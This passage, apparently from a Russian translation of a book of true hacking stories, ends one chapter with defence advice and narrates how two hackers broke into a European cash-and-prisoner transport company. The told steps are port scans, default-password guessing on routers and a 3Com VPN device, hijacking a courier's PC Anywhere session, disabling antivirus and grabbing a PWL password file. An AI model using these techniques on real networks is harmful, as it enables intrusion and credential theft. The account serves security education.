сеть. Поэтому межсетевой экран не может остановить каждую атаку. Хакер отыскивает малейшие бреши в защите, стараясь использовать те сервисы, которые разрешены правилами межсетевого экрана. Одна из возможных стратегий снижения этой угрозы заключается в том, чтобы поместить все системы публичного доступа в отдельный сегмент сети и тщательно фильтровать трафик в более важные сегменты.  Например, если SQL-сервер расположен в корпоративной сети, то можно установить второй межсетевой экран, позволяющий соединения только с портом, на котором расположена данная услуга.  Установка внутренних межсетевых экранов для защиты важной информации достаточно неприятная процедура, но ее надо использовать, если вы действительно хотите защитить свои данные от злонамеренных сотрудников и внешних хакеров, которым удастся прорваться через периметр.   ПОСЛЕСЛОВИЕ   Ничто не остановит опытного хакера на пути к его цели. Он пристально изучит систему, которую он атакует, и определит все ее звенья и общедоступные сервисы. Хакер может ждать недели, месяцы и даже годы, чтобы отыскать и использовать новую, еще никому не известную лазейку. В процессе моей хакерской карьеры я лично проводил долгие часы, атакуя ту или иную компьютерную сеть. И моя настойчивость всегда была вознаграждена, поскольку я находил бреши в стенах защиты.  Хакер Эрик пошел еще дальше в своей настойчивости и стремлении получить коды программы, на что он потратил около двух лет. А Роберт предпринял целую цепь сложных шагов для того, чтобы получить миллионы адресов электронной почты для своего друга спамера.  Вы понимаете, что два этих хакера не уникальны. Их настойчивость вполне обычна в хакерском сообществе. Люди, ответственные за обеспечение безопасности инфраструктуры организации, должны понимать, с кем им предстоит сражаться. В распоряжении хакеров практически неограниченное время для поисков брешей в защите, а перегруженный работой сетевой администратор может выделить лишь небольшое время для занятий безопасностью.  Как мудро писал китайский философ Сун Тзу (Sun Tzu) в своей книге «Искусство войны» (Oxford University press: New York , 1963): «Познайте себя и познайте вашего врага, тогда в сотне битв вы избежите поражения. Даже если вы хорошо знаете себя, но не знаете вашего врага, — ваши шансы на победу и поражение примерно равны…» Идея понятна: ваши соперники могут потратить любое время на проникновение туда, куда им нужно. Поэтому вам следует провести оценку различных рисков, чтобы четко понять степень угрозы для вашей компании, и все обнаруженные угрозы надо принимать во внимание при разработке стратегии безопасности. Если вы будете готовы к нападению, и постоянно будете продумывать, внедрять и совершенствовать ваши методы защиты безопасности, то вам удастся сдерживать атаки хакеров.  Как мы уже отмечали, любой серьезный хакер может проникнуть куда угодно, но ваша цель — сделать его жизнь настолько сложной и утомительной, чтобы «овчинка не стоила выделки».       Глава 9.    На   континенте      Вначале вы видите лишь клоч к иинформации и то, как устроены те или иные вещи, и постепенно у вас начинает зарождаться понимание всей структуры компании и мировоззрения людей, ответственных за организацию ИТ-системы. Начинаешь постигать, что они знают о безопасности, и что они для нее делают.  Луис   В начале предыдущей главы мы предостерегали читателей, что людям без технического образования будет трудно воспринять некоторые ее части. Это еще более справедливо для этой главы. Но советую вам все же прочитать ее. поскольку история просто удивительная. И суть ее вполне можно понять, опуская сложные технические детали.   ГДЕ  -  ТО   В   ЛОНДОНЕ   Итак — мы находимся где-то в лондонском Сити.  Картина следующая: большая комната без окон в глубине здания, где тусуется технический персонал. Прекрасная иллюстрация для историй о «хакерах, как о существах, далеких от общества и не связанных с ним», работающих каждый за собственным компьютером и связанных друг с другом только «в удаленном доступе».  Давайте назовем одного из них Луисом. Он вырос в маленьком городке в северной Англии и начал общаться с компьютером в возрасте семи лет, когда его родители купили «какое-то старое железо», чтобы дети получили представление о современной технологии. Он начал заниматься хакерством еще в школе, когда случайно обнаружил список всех пользователей и их паролей, и его любопытство впервые зашевелилось. Этим первым хакерским опытом он нажил себе большие проблемы, так как один из студентов старших курсов («префект» по английской терминологии) поймал Луиса. Но эта неудача не отвратила его от компьютерных секретов.  Теперь высокого темноволосого взрослого Луиса больше не волнуют достижения в «самых английских видах спорта» — крикете и футболе, которые так занимали его, когда он был школяром.   ПОГРУЖЕНИЕ   Некоторое время тому назад Луис со своим приятелем Броком занимались совместным проектом. Их мишенью была компания, расположенная где-то в Европе — компания, занимающаяся безопасностью, перевозящая большие суммы денег, а также и заключенных из тюрьмы в суд и обратно, и из одной тюрьмы в другую. ( Т о , что одна и та же компания занимается перевозкой денег и заключенных, необычно для американцев, но это вполне общепринято в Европе и в Англии).  Любая компания, которая объявляет, что занимается чем-то, связанным с безопасностью, берет на себя большую ответственность. Если они занимаются безопасностью, означает ли это, что хакеры не могут взломать их систему? Для любой группы ребят с хакерским менталитетом подобная декларация звучит как вызов, особенно, если вначале у ребят нет ничего, кроме названия компании.  «Мы относились к этому, как к проблеме, которая должна быть решена. Поэтому сначала мы должны были отыскать как можно больше информации об этой компании», — говорит Луис. Они начали с того, что стали искать упоминания о компании в Google, используя Google даже для перевода текстов, поскольку никто из них не говорил на языке той страны, где была расположена их мишень.  Автоматический перевод давал им вполне достаточное представление о том, чем занимается компания и насколько велик ее бизнес. Но им было непросто организовывать атаки социальной инженерии из-за языкового барьера.  Они смогли определить общедоступные IР-адреса компании для Интернет-сайта и почтового сервера из европейского регистра IP-ад-ресов (RIPE), аналогичного A R I N в США.  (ARIN — American Registry of Internet Numbers — американский регистр Интернет-адресов — это организация, которая управляет номерами IP-адресов для США и примыкающих к ним стран. Поскольку Интернет-адреса должны быть уникальными, должна существовать специальная организация, которая будет следить за этим и выделять компаниям блоки IP-адресов. RIPE — Reseaux IP Europeens — организация, распределяющая номера IP-адресов для Европы).  Они поняли, что хостингом внешнего сайта занималась специальная компания. Но IP-адрес их почтового сервера был зарегистрирован на саму компанию и располагался внутри их корпоративных адресов. Поэтому наши ребята могли запросить DNS компании и получить IP-адреса, проверяя записи обмена письмами.  Луис попробовал применить технику посылки электронной почты на несуществующий адрес. Вернувшееся к нему письмо с уведомлением о том, что оно не может быть доставлено, могло содержать в своем заголовке некоторые IP-адреса компании и некоторую информацию о маршруте доставки электронной почты.  Однако в нашем случае Луис получил ответ от внешнего почтового ящика компании, поэтому в нем не содержалось никакой полезной для него информации.  Брок и Луис понимали, что их жизнь стала бы легче, если бы у компании был собственный Domain Name Server. В этом случае они могли бы сделать запросы, чтобы попытаться получить больше сведений о внутренней сети компании или использовать какие-то лазейки, связанные с конкретной версией DNS. Им не повезло: DNS компании был расположен у местного Интернет-провайдера.   ОПРЕДЕЛЕНИЕ   СТРУКТУРЫ   СЕТИ   В качестве следующего шага Луис и Брок использовали обратное сканирование DNS, чтобы получить имена узлов различных систем, расположенных в диапазоне IP-адресов компании (как уже не раз объяснялось в главе 4 и других местах). Чтобы сделать это, Луис использовал «просто текст REFL», который написали сами ребята. (Обычно атакующие используют имеющееся в наличии ПО для обратного DNS-сканирования, например, такое, как на сайте  http://www.samspade.org  ).  Они заметили, что «от некоторых систем компании к ним возвращалось достаточно много информативных имен», которые служили ключом к тому, кто какие функции выполняет внутри компании. Это давало также некоторое представление о стиле мышления сотрудников ИТ-департамента компании. «Выглядело так, как будто администратор не полностью контролирует всю информацию о своей сети, а это был первый ответ на вопрос: смогут ли они проникнуть внутрь или нет». По мнению Брока и Луиса, полученные сведения давали основания для оптимизма.  Это один из примеров того, как кроме чисто технических методов проникновения хакеры занимаются и своеобразным психоанализом, стараясь проникнуть в головы администраторов и понять, как они создавали свою сеть. Для наших конкретных атакующих «это было основано частично на уже имеющемся у нас знании о сетях и компаниях, которые мы уже видели в европейский странах, на наших ИТ-знаниях и на том факте, что в этой стране люди отставали от Англии на год-полтора».   ОПРЕДЕЛЕНИЕ   МАРШРУТИЗАТОРА   Они анализировали сеть, используя обычный метод отслеживания путей UNIX, который показывает число маршрутизаторов, через которые прошли пакеты данных к определенной цели; на жаргоне это называется числом «скачков». Они проанализировали подобные пути для почтового сервера и для пограничного межсетевого экрана. Отслеживание путей показало им, что почтовый сервер находится на один скачок за межсетевым экраном.  Эта информация дала понять, что почтовый сервер либо находится в DMZ, либо все системы за межсетевым экраном расположены в одной сети. (DMZ — это так называемая демилитаризованная зон а — электронная область, где нет людей, расположенная между двумя межсетевыми экранами и обычно доступная как из внутренней сети, так и из Интернета. Цель DMZ состоит в защите внутренней сети на тот случай, если какая-то из систем, доступная из Интернета, будет взломана).  Они знали, что у почтового сервера открыт порт 25 и, проделав traceout, поняли, что могут проникнуть через межсетевой экран для связи с почтовым сервером. «Вначале нам показалось, что мы сбились с пути, но потом мы быстро поняли, что перескочили маршрутизатор, и находимся уже за межсетевым экраном, а еще на один скачок за ним мы увидели почтовый сервер, и мы начали понимать, как устроена сеть».  Луис говорил, что они часто начинают свою атаку с проверки нескольких общедоступных портов, которые, как известно, остаются открытыми для межсетевого экрана: среди них он называл порт 53 (используемый Domain Name Service); порт 25 (почтовый сервер SMTP); порт 21 (FTP); порт 23 (telnet); порт 80 (HTTP); порты 139 и 445 (оба используются для NetBIOS в различных версиях Windows).  «Перед тем, как проводить сканирование портов, мы очень точно убедились, что имеем список узлов для атаки, в котором нет неиспользуемых IP-адресов. На самом начальном этапе надо иметь список реальных мишеней, а не перебирать все IP-адреса слепо. После перечисления потенциальных мишеней мы поняли, что есть пять-шесть систем, которыми имеет смысл заниматься и дальше».  Они обнаружили только три открытых порта: почтовый сервер, Интернет-сервер со всеми установленными заплатками в системе безопасности, которые на самом деле даже не использовались и telnet на порте 23. Когда они пытались проникнуть в систему через telnet, то всегда получали типичный для оборудования компании Cisco ответ «Проверка права доступа», Таким образом, единственное, что им удалось узнать на этом этапе, это тип маршрутизатора.  Луис знал из своего опыта, что пароль на маршрутизаторах Cisco часто устанавливался каким-то очевидным. « Н а этот раз мы попробовали три разных пароля „имя компании“, „blank“ и „Cisco“, но не смогли проникнуть в маршрутизатор. Поэтому, чтобы не создавать лишнего шума, мы решили прекратить попытки проникновения через эту услугу».  Они попробовали просканировать устройство Cisco на предмет открытых общеизвестных портов, но не смогли никуда попасть. «Итак, в первый день нашей работы мы потратили много времени и сил на изучение компании и ее сети и начали первичное сканирование некоторых портов. Не могу сказать, что мы были готовы отказаться от своей затеи, поскольку у нас в запасе еще было несколько приемов, которые мы всегда пробовали в своей практике перед тем, как прекращали атаку».  В общем, все, что они сделали за первый день, это идентифицировали один маршрутизатор.   ДЕНЬ   ВТОРОЙ   Настал второй день и Луис и Брок решили н а ч а т ь более интенсивное сканирование портов. Вот что рассказывает Луис, используя термин «услуги» для обозначения открытых портов.  «В этот момент мы думали о том, что надо найти больше услуг на этих компьютерах. Поэтому мы несколько изменили стратегию атаки и решили поискать их более тщательно. Мы расширили объем поисков, чтобы отыскать что-нибудь, что помогло бы нам проникнуть в сеть. Мы видели, что у них стоял межсетевой экран с очень хорошей фильтрацией. Мы искали в нем хотя бы небольшую ошибку или неправильную конфигурацию».  Затем, используя программу Nmap — стандартное средство для сканирования портов — они проделали сканирование набора услуг при помощи файла, который просматривал каждый из 1600 портов; и опять не нашли ничего интересного.  «Итак, мы провели максимально полное сканирование, проверив маршрутизатор и почтовые сервера». Максимально полное означает проверку более 65 т ы с я ч портов. « М ы проверили к а ж д ы й ТСР-порт и искали возможные услуги на таких портах, которые были в нашем списке».  Наконец они нашли нечто интересное, немного странное и поставившее их в тупик.  Порт 4065 был открыт. Странно было, что порт с таким большим номером используется. Луис о б ъ я с н я е т : « М ы подумали, что, может быть, они сконфигурировали telnet на этот порт. Поэтому мы послали telnet-сигнал на этот порт и стали ждать отклика». (Telnet — это протокол для удаленного управления компьютером в любом месте Интернета). Используя telnet, Луис присоединялся к удаленному порту, который воспринимал команды от его компьютера и отвечал на них так, что ответы попадали на экран компьютера Луиса.  Когда они попытались соединиться, то в ответ получили запрос имени пользователя и логина. Итак, они оказались правы в том, что порт использовался для telnet-соединений, но появившееся диалоговое окно для авторизации пользователя очень отличалось от того, что обычно появляется на оборудовании компании Cisco. «Через некоторое время мы поняли, что это был маршрутизатор компании 3Com. Это несколько смутило нас, поскольку не так часто попадается устройство, которое выглядит, как совсем другое устройство, да еще при этом предлагает услугу в порте с очень большим номером». То, что telnet работает через порт 4065 при помощи устройства компании 3Com, выглядело какой-то бессмыслицей.  «Мы видели, что на устройстве открыты два порта, но они идентифицировали себя, как совершенно разные устройства, изготовленные различными производителями оборудования».  Брок отыскал этот TCP-порт с большим номером и присоединился к нему при помощи telnet. «После того, как он получил запрос на имя пользователя, он ввел „admin“ и начал пробовать такие простейшие пароли, как „password“, „admin“, „blank“. Ему повезло буквально через несколько попыток: имя пользователя и пароль на устройстве 3Com были одинаковыми — „admin“. „В это мгновение он заорал, что все-таки проник“, — вспоминает Луис, что означало, что они получили через telnet доступ к устройству 3Com. Особенно приятным было то, что это оказалась директория администратора.  «То, что мы отгадали пароль, был наш первый крупный успех в этой работе. Далее все шло по обычной схеме. Мы работали на разных машинах. Вначале мы проводили сканирование сети независимо и обменивались результатами. Но после того, как мы обнаружили возможность доступа через конкретный порт, я перешел на его машину и мы начали работать вместе на одном и том же компьютере.  Это было прекрасно. Мы вошли в устройство 3Com и получили полный доступ к нему, а может — и широкую улицу к другим достижениям. Прежде всего мы хотели понять, что это за устройство и почему доступ к нему реализован через порт с таким большим номером на маршрутизаторе Cisco».  При помощи командной строки они смогли запросить информацию об устройстве. « М ы подумали, что, может быть, кто-то включил кабель управляющей консоли от устройства 3Com в устройство Cisco, и именно этим вызван неадекватный доступ». Это походило на правду, поскольку таким способом сотрудники могли подключиться через telnet к устройству 3Com через маршрутизатор. «Может быть, у них был дефицит мониторов или клавиатур в их компьютерном центре, — гадал Луис, — и они использовали нестандартный кабель в качестве временной меры». А потом администратор просто забыл об этом, как говорит Луис, «совершенно не думая о последствиях своих действий».   ИЗУЧЕНИЕ   КОНФИГУРАЦИИ УСТРОЙСТВА   3Com   Наши герои поняли, что устройство 3Com расположено за межсетевым экраном и что ошибка администратора предоставила им неожиданный кружной путь, позволяющий атакующим соединиться с портом с большим номером в обход межсетевого экрана.  Теперь, имея доступ к панели управления 3Com, они стали искать записи о конфигурации, включая и то, какие устройства с какими IP-адресами соединены, и какие протоколы используются для реализации локальной сети. Они обнаружили, что устройство находится в том же диапазоне адресов, что и почтовый сервер, и вне внутреннего межсетевого э к р а н а , в DMZ. « М ы сделали вывод, что устройство находится под защитой межсетевого экрана и защищено от подключений из Интернета неизвестным нам набором фильтров».  Они попытались определить конфигурацию самого устройства, чтобы понять, как устанавливаются входящие соединения, но через имеющийся интерфейс они не смогли получить нужной информации. Они продолжали размышлять, почему, когда пользователь соединялся с портом 4065 в маршрутизаторе Cisco из любого места Интернета, соединение происходило с устройством 3Com, которое было включено в маршрутизатор Cisco.  «В этот момент мы были почти уверены, что получим доступ ко входам в с е т ь и проберемся в ее сердцевину. Мы находились в прекрасном настроении, но, как говорится, были порядком утомлены, поскольку интенсивно работали в течение двух дней.  Мы отправились в пивную, чтобы обсудить, как сделать следующие дни не менее удачными, поскольку мы собирались начать просматривать конкретные системы и проникать вглубь сети».  Продолжая думать все о том же устройстве 3Com, они установили режим записи активности управляющей консоли. Если что-то случится ночью, то они увидят все сделанное следующим утром…   ТРЕТИЙ   ДЕНЬ   Когда Брок просматривал эти записи на следующий день, то обнаружил, что там появлялись различные IP-адреса. Луис поясняет: «после более пристального изучения устройства 3Com мы поняли, что это была разновидность VPN, которую удаленные пользователи использовали для соединения с сетью компании из любого м е с т а Интернета. В этот момент мы были уверены, что попадем в сеть тем же путем, как это делают авторизованные пользователи».  Они попытались установить свой личный VPN-интерфейс на устройстве 3Com, напечатав другой интерфейс в диалоговом окне 3Com с другим IP-адресом, одним из тех, что межсетевой экран наверняка бы не отфильтровал.  Это не сработало. Они обнаружили, что устройство не может быть сконфигурировано без нарушения существующей системы услуг. Они не могли создать новую VPN-систему, поскольку архитектура устройства была такова, что их возможные действия в нем были весьма ограничены.  «Наши надежды на быстрый доступ внутрь сети быстро таяли. Мы расстроились и притихли. Но это была лишь одна из наших первых попыток, и просто обязан был существовать еще один путь. У нас был сильный стимул, ведь доступ к одному из устройств — это хороший плацдарм для атаки. Просто надо было работать интенсивнее».  Они находились в DMZ сети компании, но когда попытались соединиться оттуда со своим компьютером, им это не удалось. Они хотели выяснить, какие системы присутствуют в сети (так называемый ping), но сделать это из устройства 3Com за межсетевым экраном, чтобы расширить свой список возможных мишеней для атаки. Если бы там были какие-нибудь адреса устройств в оперативной памяти, это означало бы, что какое-то устройство блокирует доступ к протоколам самого высокого уровня. «После нескольких попыток», — говорит Луис, «мы обнаружили входы в оперативную ARP-памятъ, указывающую на то, что некоторые компьютеры сообщают свои адреса». (ARP — Adress Resolution Protocol — это метод для обнаружения адресов узлов. Каждый узел держит в буфере набор адресов, которые через него прошли, чтобы ускорить передачу пакетов данных).  В домене определенно были другие компьютеры, «но на запрос ping они не давали ответа, что было классическим признаком межсетевого экрана. Для тех, кто не знаком с техникой „pinging“, это техника сканирования сети, которая состоит в передаче пакетов определенного типа (ICMP) на компьютер-мишень, чтобы определить — включен он или нет. Если узел работает, то он отвечает своеобразным пакетом ICMP-echo. Это только подтвердило наши подозрения, что есть еще один межсетевой экран и еще один уровень безопасности между устройством 3Com и их внутренней сетью». Луис почувствовал, что они зашли в тупик.  «Мы получили доступ к их VPN-устройству, но не могли с его помощью создать собственную VPN-сеть. Н а ш энтузиазм начал снижаться. Появилось ощущение, что проникнуть в эту сеть будет не так-то просто. Необходим был „мозговой штурм“ для свежих идей».  Они решили исследовать IP-адреса, которые нашли в записи об активности консоли. « М ы решили посмотреть, кто же соединяется с нашим устройством 3Com удаленно, поскольку, если вам удается проникнуть в устройство, то вы можете перехватить его соединения». Или же они могли получить там необходимую для авторизации информацию, которая помогла бы им выдать себя за законных пользователей.  Они знали определенный набор фильтров, говорит Луис, и искали пути обхода этих фильтров в межсетевом экране. Он надеялся на то, что они смогут «найти защищенную систему, в которую им удастся проникнуть через межсетевой экран. Нас очень интересовали IP-ад-реса».  Когда они соединялись с консолью системы 3Com, объясняет он, при соединении с ней удаленного пользователя или изменении конфигурации на экране появлялось соответствующее сообщение. « М ы могли видеть все соединения, идущие на этот IP-адрес».  Они увидели там и информацию об организациях, которым принадлежали эти адреса. Там имелась и контактная информация административного и технического персонала, отвечающего за сети этих организаций. Используя эти адреса, они опять обратились к регистрационной базе данных на RIPE, которая предоставила им информацию о том, на какую компанию зарегистрированы эти IP-адреса.  Их ждал еще один сюрприз. « М ы обнаружили, что адреса зарегистрированы на крупного телекоммуникационного провайдера в той стране. Тогда еще у нас не складывалась общая картина, мы не могли понять, что означают эти IP-адреса и зачем люди из телекома соединяются с этим устройством», — рассказывает Луис, используя английский термин «telecom» для того, что чаще называется Интернет сервис-провайдерами. И они задумались, а что, если VPN —соединения могут исходить и от удаленных пользователей компании, или от чего-то такого, что им вообще трудно было себе представить.  «Пришла пора нам сесть и очень серьезно задуматься о происходящем. Нам просто необходимо было увязать воедино все кусочки картины, имевшиеся в нашем распоряжении, чтобы понять хоть что-нибудь. Наши надежды пока не сбывались. Мы получили доступ в систему, но продвинуться дальше не смогли, и вообще не достигли за день никакого прогресса. Но, вместо того, чтобы пойти домой, и попытать счастья на следующее утро, мы решили пойти в пивную, выпить, расслабиться и прочистить свои головы перед тем, как отправиться домой на общественном транспорте.  Б ы л а ранняя весна, морозец еще пощипывал щеки. Мы вышли из офиса и завернули за угол, где располагался тихий и спокойный, традиционный английский паб.  Я пил темное пиво, а Брок — персиковую водку с лимонадом — очень славная выпивка, всем рекомендую попробовать. Мы просто сидели там, трепались и размышляли, почему за день нам не удалось сделать все, что мы намечали. После первого стакана мы успокоились и достали листок и наши авторучки. Мы начали выдвигать идеи о том, что делать дальше.  Много чего мы н а м е т и л и в т о т вечер, поэтому, в е р н у в ш и с ь н а з а в т р а к компьютерам, мы смогли быстро с е с т ь и начать работать. Мы зафиксировали все, что нам было известно о структуре сети, и попытались понять, каким пользователям нужен доступ к VPN, где физически расположена система, и реконструировать возможные идеи авторов системы при создании службы удаленного доступа к ней.  Мы попытались нарисовать все, что знали о системе, а также и других системах, которые были с ней связаны. Прежде всего мы хотели понять, где в сети расположено пресловутое устройство 3Com. В нижней части рисунка мы нарисовали много квадратиков. По нашему мнению, такие люди, как курьеры и водители должны были иметь доступ к некоторым частям системы. И все же мы не были уверены в этом».  Луис пытался понять, кто, кроме сотрудников компании, может нуждаться в доступе к ней. Они имели дело с компанией, которая заслуженно гордилась своими технологическими инновациями. поэтому Луис и Брок подумали, что, может быть, в ней разработали «какое-то действительно мощное приложение», которое позволяло бы курьерам входить в систему после доставки товара, а затем получать следующее задание. Это приложение могло быть специально защищено от всевозможных ошибок и дурацких действий. Может быть, водителю достаточно было подвести мышкой курсор к иконке, чтобы дать сигнал приложению соединиться с сервером и получить следующий маршрутный лист.  «Мы думали о том, что эти самые водители не могут быть экспертами в компьютерной области, поэтому система должна быть очень простой в общении. Мы начали думать об этом с точки зрения бизнеса: какую систему просто установить, просто поддерживать и в то же время обеспечивать ее безопасность?»  Они начали думать о системе связи dial-up, «скорее всего с ноутбука в кабине автомобиля в распоряжении водителя». Тут два варианта: либо компания сама занимается хостингом, — тогда адреса серверов уже в нашем распоряжении, либо отдает их на сортировку кому-то еще. Можно предположить, что этим «кем-то» является телекоммуникационная компания, следы которой мы заметили в своих записях. Мы предположили, что именно с ней связь организуется из Интернета через VPN-канал». Это укладывалось в схему, по которой водители звонят в эту телекоммуникационную компанию и авторизуются перед тем, как их допустят до соединения с сетью компании-мишени.  Но была и еще одна возможность, продолжает Луис. «Мы продолжали размышлять: „Давай посмотрим, сможем ли мы создать такую архитектуру, в которой парень из грузовика соединялся бы через dial-up с системой, проходил бы там авторизацию и авторизовался бы системой компании, а не провайдером телекоммуникационных услуг. Как можно организовать в такой компании VPN, чтобы любая информация от водителя добиралась до основной компании и не была бы расшифрована в Интернете?“  Они подумали и о том, как решает компания проблему авторизации пользователей. Если курьер должен соединяться с одной из систем, расположенных в телекоммуникационной компании и авторизоваться в ней, тогда и услуги авторизации должны отдаваться на аутсорсинг. Решение могло быть другим, если бы верным оказалось предположение о том, что компания осуществляет хостинг сама, а не у провайдера Интернет-услуг.  Часто задача авторизации передается отдельному серверу, который выполняет эту функцию. Вполне возможно, устройство 3Com использовалось для доступа к идентификационному серверу внутренней сети компании-мишени. Звоня с сотового модема, водитель соединялся с Интернет-провайдером, а затем переадресовывался на устройство 3Com, где его имя пользователя и пароль посылались на другой сервер для авторизации.  Итак, на этом этапе их рабочая гипотеза заключалась в том, что при инициации dial-up соединения устанавливается VPN-соединение между инициатором и устройством 3COM.  Луис и Брок догадывались, что для получения доступа к внутренней сети надо получить доступ к ISP, с которыми и соединяются водители машин. Однако, «мы не знали номера dial-up этих устройств. Они были расположены в незнакомой стране, и мы не знали, что это за телефонные линии, и как получить эту информацию самостоятельно. Мы знали только то, что тип протокола, используемого в V P N , был PPTP». А это было важно, потому что установленный « п о умолчанию» Microsoft V P N сохраняет в своей п а м я т и логин и пароль тех, кто с ним соединялся.  К тому времени, когда они это поняли, они уже порядком выпили и решили «пойти напролом».  «В этот момент мы подумали, что хорошо бы сохранить листок бумаги, на котором мы записывали все результаты нашего „мозгового штурма“, поскольку, если мы все же прорвемся внутрь системы, то этот листок будет уникальным экспонатом. Мы оба были просто горды друг другом за то, что мы смогли придумать».   КОЕ  -  ЧТО   ОБ   ИНТУИЦИИ   ХАКЕРА   Все, до чего додумалась в ту ночь эта парочка, оказалось очень близко к реальности. Луис говорит об этом, как об особом роде хаке-рской интуиции.  «Трудно объяснить, как ты начинаешь это ощущать. Это опыт, это приходит в результате долгого изучения того, как создаются подобные системы.  На самой ранней стадии Брок почувствовал, что надо продолжать этим заниматься, так как мы сможем достичь результата именно этим путем; это трудно объяснить. Интуиция хакера?  Вначале вы видите лишь клочки информации и то, как устроены те или иные вещи, но постепенно у вас где-то внутри начинает зарождаться понимание всей структуры компании и мировоззрения людей, ответственных за организацию ИТ-системы. Начинаешь постигать, что они знают о безопасности, и что они для нее делают».  Я считаю, что хакеры достигают какого-то уровня понимания того, как сконфигурированы сети и системы, просто внимательно наблюдая за всем происходящим. За тем, как действуют системные администраторы, как они думают. Это как в шахматах, когда вы стараетесь просчитать, перехитрить своего оппонента.  Итак, суть здесь заключается в глубоком понимании того, как обычно мыслят и действуют сетевые администраторы, какие типичные ошибки они делают. Может, прав Луис, который считает: то, что некоторые люди называют интуицией, лучше назвать опытом.   ДЕНЬ   ЧЕТВЕРТЫЙ   Следующее утро началось с проверок записей на устройстве 3Com, в ожидании тех, кто попытается осуществить соединение. Как только соединение происходило, они старались как можно быстрее определить IP-адрес входящего соединения.  Они обнаружили, что подобные соединения длились минуту или около того, а потом прерывались. Если их предположение было верным, это означало, что курьер соединялся через dial-up, получал рабочее задание и прерывал соединение. Это означало, что им надо было действовать максимально быстро. «Когда мы видели, что появился новый IP-адрес, то дрожащими руками старались схватить его», — так образно Луис описывает свои ощущения. Адреналин буквально переполнял их в этот момент, как будто они играли в увлекательную компьютерную игру.  Так они выявили несколько портов для услуг, которые могли быть уязвимы, надеясь найти тот, который они смогли бы атаковать, например, telnet или ftp-сервер, или Интернет-сервер с недостаточным уровнем безопасности. К тому же, они надеялись получить доступ к открытым общедоступным директориям через NetBIOS. Они изучали также и такие программы на основе удаленного терминала GUI, как WinVNC или PC Anywhere.  По мере того, как занимался день, они увидели, как на некоторых узлах заработали определенные сервисы.  «Мы никуда не проникали, мы просто сидели и активно сканировали все, когда появлялось соединение с удаленным пользователем. И когда произошло очередное соединение, мы провели очередное сканирование и нашли открытый порт, используемый для PC Anywhere».  Приложение PC Anywhere позволяет получить удаленный контроль над компьютером. Однако, это можно сделать только в том случае, когда другой компьютер тоже выполняет какую-то программу.  «Видя этот порт во время сканирования, мы испытали очередной прилив энтузиазма: «О, на этой машине работает PC Anywhere. Это, наверное, один из компьютеров пользователей, давайте попробуем с ним разобраться.  Мы как будто кричали в пространство: «У кого установлен PC Anywhere?». Кто-то кричал нам в ответ: «Это мы». Поэтому я прокричал IP-адрес, так, чтобы он мог соединиться с системой как можно быстрее».  Луис называет попытку соединения с системой PC Anywhere «очень важным моментом». Он присоединился к другому парню, — пользователю, при помощи окна, появившегося на экране. «Вначале там был просто темный фон, — рассказывает Луис, — а затем происходила одна из двух вещей — либо быстро появлялся серый пароль, или же фон становился голубым, и на сцену выходила система Windows desktop».  «Именно ответа в варианте desktop мы ждали, затаив дыхание. Мгновения казались вечностью, пока мы ожидали, что черный экран исчезнет. Я думал про себя: „Соединяйся, соединяйся, время кончается“. И еще: „я хочу получить пароль“.  Как раз в последнюю секунду, когда я подумал: «ну, сейчас появится пароль» — появился Windows desktop! Ура! Мы, наконец, получили вожделенный desktop. Все, кто был в комнате, могли подойти и посмотреть. Моей первой реакцией было: «У нас опять появился шанс, нельзя его упустить!»  Итак, им опять повезло, они «поймали» клиента, который соединился с устройством 3Com.  «В этот момент мы подумали, как говорится: „либо пан, либо пропал“ —мы знали, что эти люди соединяются лишь на короткое время и понимали, что у нас может просто не быть другой возможности».  Первое, что надо делать при появлении сессии PC Anywhere, это нажимать две клавиши на экране. Луис называет их так: «Кнопка очистки экрана» и «Кнопка для фиксации клавиш консоли». Он объясняет:  «Когда вы используете PC Anywhere, по умолчанию оба пользователя —на компьютере и тот, кто использует PC Anywhere — имеют доступ к мышке и могут двигать ей по экрану, чтобы запускать приложения или открывать файлы и т.п. Но при помощи PC Anywhere вы можете заблокировать клавиатуру для другого пользователя».  Они сделали это и получили контроль над сессией, убедившись, что пользователь не может видеть, что они делают, поскольку они обнулили его экран. Луис понимал, что довольно скоро у пользователя возникнут какие-то подозрения или он решит, что у него определенные проблемы и отключит компьютер, поэтому времени у них было совсем мало.  «Мы пытались использовать этот шанс и получить доступ внутрь системы. Надо было быстро решить, что мы хотим предпринять, и какую ценную информацию можно извлечь из этого компьютера.  Я заметил, что на компьютере была установлена ОС Microsoft Windows 98 и нам надо найти кого-то, кто посоветует, какую информацию можно извлечь из такого компьютера.  К счастью один из ребят, находившихся рядом с нами, не был полностью погружен в свои занятия и знал, как извлечь информацию из такой системы».  Он предложил посмотреть на файл со списком паролей (PWL). (Это файл, используемый в системах Windows 95, 98 и ME, содержит важную информацию, такую, например, как пароли для dial-up и сетевые пароли. Например, если вы используете вход в сеть dial-up под Windows, все детали авторизации, включая номер телефона dial-up, имя пользователя и логин содержатся именно в этом файле).  Перед тем, как загрузить к себе этот файл, они должны были отключить все антивирусные программы, чтобы те не обнаружили средств, которые они использовали. Затем они попытались использовать возможности передачи файлов в PC Anywhere, чтобы передать PWL-файл из компьютера, которым пользовался курьер в данный момент, на свой компьютер. Это не сработало. «Мы не понимали почему, но у нас не было времени сидеть и обсуждать это. Мы должны были извлечь PWL-информацию из того компьютера немедленно, пока курьер еще не прервал соединения».  Что еще они могли сделать? Одна из возможностей: загрузить туда программу для взлома паролей, взломать PWL-файл на компьютере курьера и извлечь информацию в текстовый файл, который потом переслать себе. У них уже было имя пользователя и пароль, которыми пользовался курьер. Но они вовремя осознали проблему: клавиатура на компьютере курьера была на иностранном языке — вот что было причиной их неудачи с авторизацией. « М ы продолжали получать сигнал „Имя неправильное“, потому что клавиши клавиатуры там означали другие буквы». А время бежало…  «Мы чувствовали, что время уходит. Парень, сидящий в грузовике, мог перевозить кучу денег, или, к примеру, заключенных. Он вполне мог задать себе вопрос: „Что за чертовщина здесь происходит?“ В таком случае, он отключился бы еще до того, как мы получили то, что нам было нужно».  Да, время сейчас играло не в их пользу, и никто из их коллег в той же комнате не мог помочь разрешить проблему с иностранной клавиатурой. Может быть, в более спокойной обстановке они смогли бы ввести имя пользователя и пароль, используя коды ASCII вместо настоящих букв и цифр. Но в данный момент никто не мог посоветовать им, как это сделать.  Что же делать сегодня человеку, если ему очень быстро нужно пол у ч и т ь ответ на вопрос? Именно это и сделали Луис и Брок: « М ы быстро вошли в Интернет и стали искать способы ввода букв без использования клавиатуры».  Достаточно быстро они нашли ответ: надо нажать ключ «Num Lock», затем нажать и держать ключ < A L T > , а потом набирать численные значения ASCII-символов на цифровой части клавиатуры. Остальное 